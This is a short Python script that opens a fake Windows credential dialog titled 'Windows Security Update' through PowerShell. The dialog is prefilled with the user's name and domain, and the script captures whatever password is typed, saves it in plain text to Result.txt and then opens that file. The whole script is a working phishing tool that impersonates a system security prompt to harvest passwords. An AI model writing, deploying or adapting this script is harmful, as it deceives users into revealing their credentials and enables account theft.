import subprocess

password = subprocess.Popen(["powershell.exe","$cred","=","$host.UI.PromptForCredential('Windows Security Update',","'',[Environment]::UserName,","[Environment]::UserDomainName);write-warning","$cred.GetNetworkCredential().Password"],stdout=subprocess.PIPE)

password = password.communicate()[0]
password = str(password)[11:-3]

File = open("Result.txt","w")
File.write("Password = "+password)
File.close()

subprocess.run("Result.txt",shell=True)


